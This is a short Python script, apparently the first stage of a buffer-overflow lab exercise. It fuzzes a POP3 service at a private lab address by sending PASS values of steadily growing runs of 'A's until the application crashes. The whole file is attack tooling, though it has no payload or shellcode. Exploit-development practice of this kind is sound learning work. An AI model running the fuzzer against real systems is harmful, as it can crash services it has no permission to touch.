# PART 1: Initial fuzzing
#
# We want to guess roughly how many bytes it takes to crash the application.

import socket

buffer = ["A"]
counter = 100

while len(buffer) <= 30:
	buffer.append("A" * counter)
	counter += 200

for string in buffer:
	print("Fuzzing password with {} bytes".format(len(string)))
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect(("10.11.22.75", 110))
	s.recv(1024)
	s.send("USER test\r\n")
	s.recv(1024)
	s.send("PASS {}\r\n".format(string))
	s.send("QUIT\r\n")
	s.close()
